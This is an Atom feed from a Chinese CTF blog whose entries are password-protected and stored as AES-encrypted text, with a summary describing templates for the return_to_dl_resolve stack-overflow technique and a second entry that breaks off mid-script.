<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WinterSun Space</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winter3un.github.io/"/>
  <updated>2018-08-20T03:52:54.348Z</updated>
  <id>https://winter3un.github.io/</id>
  
  <author>
    <name>WinterSun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通过return_to_dl_resolve技术秒题</title>
    <link href="https://winter3un.github.io/2018/08/19/return-to-dl-resolve/"/>
    <id>https://winter3un.github.io/2018/08/19/return-to-dl-resolve/</id>
    <published>2018-08-20T03:47:22.000Z</published>
    <updated>2018-08-20T03:52:54.348Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;比赛中常常会遇到基础栈溢出类的题（并且开启ASLR+DEP），写这篇文章的目的主要是构造&lt;code&gt;return_to_dl_resolve&lt;/code&gt;技术的32位与64位模板，再遇到类似的栈溢出题目时，就不必再绕很大的圈子做了，直接秒了即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018_807个人赛复盘</title>
    <link href="https://winter3un.github.io/2018/08/07/20180807/"/>
    <id>https://winter3un.github.io/2018/08/07/20180807/</id>
    <published>2018-08-08T03:39:09.000Z</published>
    <updated>2018-08-11T13:40:27.781Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof 